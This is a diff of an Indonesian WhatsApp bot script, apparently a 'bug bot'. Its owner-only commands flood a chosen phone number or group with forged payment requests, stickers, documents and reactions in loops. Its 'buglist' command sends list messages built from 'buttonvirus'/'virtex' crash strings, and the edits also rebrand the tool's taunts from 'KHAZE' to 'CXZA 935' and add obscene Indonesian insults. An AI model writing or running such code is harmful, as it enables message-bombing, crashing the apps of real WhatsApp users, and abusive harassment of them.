@@ -704,7 +704,7 @@ if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
 if (isBan) throw sticBanLu(from)
 var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "pollCreationMessage": {
-"name": "BUG POLLING KHAZE WAS HERE",
+"name": "BUG POLLING CXZA 935 WAS HERE",
 "options": [
 	{
 "optionName": "KATANYA WA KEBAL"
@@ -780,14 +780,14 @@ if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} idGroup|a
 num = q.split('|')[0]
 jumlah = q.split('|')[1]
 for (let i = 0; i < jumlah; i++) {
-m.reply(`Oke Khaze >.<`)
+m.reply(`Oke Cxza 935 >.<`)
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
 "requestPaymentMessage": {
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
-"text": `MY DEVELOPER KHAZE WAS HERE`,
+"text": `MY DEVELOPER CXZA 935 WAS HERE`,
 }
 }}), { userJid: m.chat, quoted: doc})
 haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -809,7 +809,7 @@ var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.from
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
-"text": `MY DEVELOPER KHAZE WAS HERE`,
+"text": `MY DEVELOPER CXZA 935 WAS HERE`,
 }
 }}), { userJid: m.chat, quoted: doc})
 haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -823,7 +823,7 @@ case 'sendreaksi' : {
 if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
 if (isBan) throw sticBanLu(from)
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+a = await haikal.sendMessage(m.chat, {react: { text: "🇮🇩", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
 haikal.sendMessage(Pe, {text: "CXZA 935 WAS HERE"}, {quoted: doc})
 await sleep(20)
 haikal.sendMessage(Pe, {text: "CXZA 935 WAS HERE"}, {quoted: doc})
@@ -867,7 +867,7 @@ case 'sendbutton':
 break
 //=================================================//
 /*BUG WACAP */
-case 'sendreaksi2' : {
+case 'unikiuyty' : {
 if (isBan) throw sticBanLu(from)
 if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
@@ -892,7 +892,7 @@ if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
 let user = global.db.data.users[m.sender]
 user.afkTime = + new Date
 user.afkReason = text
-deploy(`${m.pushName} HELLO SAYA KHAZE WAS HERE ${text ? ': ' + text : ''}`)
+deploy(`${m.pushName} HELLO SAYA CXZA 935 WAS HERE ${text ? ': ' + text : ''}`)
 }
 break
 //=================================================//
@@ -901,7 +901,7 @@ if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `HALLO AKU KHAZE WAS HERE`
+ydd = `HALLO AKU CXZA 935 WAS HERE`
 for (let i = 0; i < jumlah; i++) {
 haikal.sendMessage(m.chat, {sticker: thumb},{quoted: {
 key: { 
@@ -934,7 +934,7 @@ if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `HALLO AKU KHAZE WAS HERE`
+ydd = `HALLO AKU CXZA 935 WAS HERE`
 for (let i = 0; i < jumlah; i++) {
 haikal.sendMessage(m.chat, {requestPaymentMessage: thumb},{quoted: {
 key: { 
@@ -946,7 +946,7 @@ participant: `0@s.whatsapp.net`,
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
-"text": `MY DEVELOPER KHAZE WAS HERE`,
+"text": `MY DEVELOPER CXZA 935 WAS HERE`,
 }
 }
 }})
@@ -960,7 +960,7 @@ if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `HALLO AKU KHAZE WAS HERE`
+ydd = `HALLO AKU CXZA 935 WAS HERE`
 for (let i = 0; i < jumlah; i++) {
 haikal.sendMessage(m.chat, {document: thumb},{quoted: {
 key: {
@@ -990,7 +990,7 @@ case 'bugbctext': {
 if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
 if (isBan) throw sticBanLu(from)
 
-if (!text) throw `*Type some text*\n\nExample : ${prefix + command} Khaze`
+if (!text) throw `*Type some text*\n\nExample : ${prefix + command} CXZA 935 WAS HERE`
 let doc = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `© ${botname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${haikal.user.name},;;;\nFN:${botname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': await getBuffer(picak+'Brodcast'), thumbnail: await getBuffer(picak+'Brodcast'),sendEphemeral: true}}}
 let anu = await store.chats.all().map(v => v.id)
 m.reply(`*Send Broadcast To* ${anu.length} Chat\n*Time ${anu.length * 1.5} seconds*`)
@@ -1906,7 +1906,7 @@ break
 case 'wangy':
 if (isBan) throw sticBanLu(from)
 
-if (!q) return reply (`Contoh : wangy Khaze`)
+if (!q) return reply (`Contoh : wangy Cxza 935`)
 qq = q.toUpperCase()
 awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, AAAAH BAUNYA RAMBUT ${qq} WANGYY AKU MAU NYIUMIN AROMA WANGYNYA ${qq} AAAAAAAAH ~ RAMBUTNYA.... AAAH RAMBUTNYA JUGA PENGEN AKU ELUS-ELUS ~~ AAAAAH ${qq} KELUAR PERTAMA KALI DI ANIME JUGA MANIS ❤️ ❤️ ❤️ BANGET AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️APA ? ${QQ} ITU GAK NYATA ? CUMA HALU katamu ? NGGAK, NGAK NGAK NGAK NGAK NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} GW ... ${qq} DI LAPTOP NGELIATIN GW, ${qq} .. KAMU PERCAYA SAMA AKU ? AAAAAAAAAAAH SYUKUR ${q} AKU GAK MAU MERELAKAN ${qq} AAAAAAH ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
  reply(awikwok)
@@ -4068,6 +4068,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ├❒ bugdoc6
 ├❒ bugtroli
 ├❒ bugtroli2
+├❒ buglist
 ├❒ buglokasi
 ├❒ bugliveloc
 ├❒ bugkontak
@@ -4080,7 +4081,6 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ├❒ polling > bug polling
 ├❒ bugdocu > jumlah
 ├❒ bugkontakv2 > jumlah
-├❒ buglist > jumlah
 ├❒ bugdocument > jumlah
 ├❒ bugtroliv3 > jumlah
 ├❒ bugbuttonv1 > jumlah
@@ -4146,7 +4146,6 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ├❒ jadibug5 > reply gambar
 ├❒ santetdia > 628xxx@s.whatsapp.net|10|10s
 ├❒ santetgc > 1237891xxxx@g.us|10|10s
-├❒ sendreaksi2 > 1237891xxxx@g.us
 ├❒ catalogpc > 628xxx@s.whatsapp.net|10|10s 
 └❒ cataloggc > 1237891xxxx@g.us|10|10s
 
@@ -4917,23 +4916,21 @@ haikal.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
 }
 }
 break
-case 'buglist':{
+case 'buglist':
 if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
-if (args.length == 0) return m.reply(`Jumlah?`)
-jumlah = `${encodeURI(q)}`
-for (let i = 0; i < jumlah; i++) {
-des = [
+if (isBan) throw sticBanLu(from)
+if (!mek.key.fromMe) return reply('Khusus Owner Ajg!')
+
+touchmebre = [
 {
-title: `BUG LIST CXZA 935`,
- rows: [
-{title: virtex1, rowId: `CXZA`, description: `KONTOL BAPAK KAU`},
-{title: virtex2, rowId: `WAS HERE`, description: `MEMEK MAMAK KAU`},
+title: `🌷 CXZA 935 WAS HERE 🌷 ${buttonvirus} ${buttonvirus}`,
+rows: [
+{title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `Hay Kontol`},
+{title: buttonvirus, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
 ]
 }
 ]
-haikal.sendListMsg(m.chat, `© CXZA 935 WAS HERE\n${philips}`, haikal.user.name, `© CXZA 935 WAS HERE`, `© CXZA 935 WAS HERE\n-${jobot}`, des, shield2)
-}
-}
+haikal.sendListMsg(m.chat, `🌷 CXZA 935 WAS HERE 🌷`, haikal.user.name, `HAY KAK SC BOT ADA DI LIST`, `CLICK HERE 🌷`, touchmebre, m)
 break
 case 'bugbuttonv2':{
 if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
